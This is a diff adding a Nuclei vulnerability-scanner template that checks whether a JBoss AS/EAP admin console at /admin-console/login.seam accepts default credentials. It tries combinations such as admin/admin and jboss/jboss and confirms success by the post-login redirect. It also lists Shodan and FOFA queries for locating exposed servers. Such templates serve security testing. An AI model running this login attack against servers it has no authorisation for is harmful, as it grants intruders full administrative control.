@@ -1,0 +1,85 @@
+id: jboss-admin-console-default-login
+
+info:
+  name: JBoss AS/EAP Admin Console - Default Login
+  author: J2EEScan (ilmila),Tortuginator
+  severity: high
+  description: |
+    JBoss AS/EAP SEAM-based administration console at /admin-console/login.seam accepted default credentials, granting an attacker full remote administration of the application server.
+  reference:
+    - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/JBossAdminConsole.java
+    - http://docs.jboss.org/jbossas/6/Admin_Console_Guide/en-US/html/Administration_Console_User_Guide-Accessing_the_Console.html
+    - https://www.exploit-db.com/exploits/36653/
+    - https://bugzilla.redhat.com/show_bug.cgi?id=615956
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-1392
+  metadata:
+    verified: true
+    max-request: 17
+    vendor: redhat
+    product: jboss_application_server
+    shodan-query: http.component:"JBoss"
+    fofa-query: app="JBoss"
+  tags: jboss,admin-console,default-login,seam,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /admin-console/login.seam HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        internal: true
+        dsl:
+          - 'status_code == 200'
+          - 'contains_any(body, "JBoss AS Admin", "JBoss EAP Admin", "Embedded Jopr")'
+          - 'contains(body, "javax.faces.ViewState")'
+        condition: and
+
+  - raw:
+      - |
+        GET /admin-console/login.seam HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /admin-console/login.seam HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        login_form=login_form&login_form%3Aname={{username}}&login_form%3Apassword={{password}}&login_form%3Asubmit=Login&javax.faces.ViewState={{url_encode(viewstate)}}
+
+    attack: clusterbomb
+
+    payloads:
+      username:
+        - admin
+        - jboss
+      password:
+        - admin
+        - ""
+        - jboss
+        - password
+
+    stop-at-first-match: true
+
+    extractors:
+      - type: regex
+        name: viewstate
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - '(?:name|id)="javax\.faces\.ViewState"[^>]*?value="([^"]+)"'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 302'
+          - 'contains(header_2, "secure/summary.seam")'
+        condition: and
+# digest: 4a0a00473045022079714db3a9d2ab5d77fb9901c1bcd5cb5b872a00933bfcb9c6737f6c959a9ca1022100aa5d78fcffd7248bfccd3e551c9c3cd1b750d49e07a25484efbc23e795c53976:922c64590222798bb761d5b6d8e72950
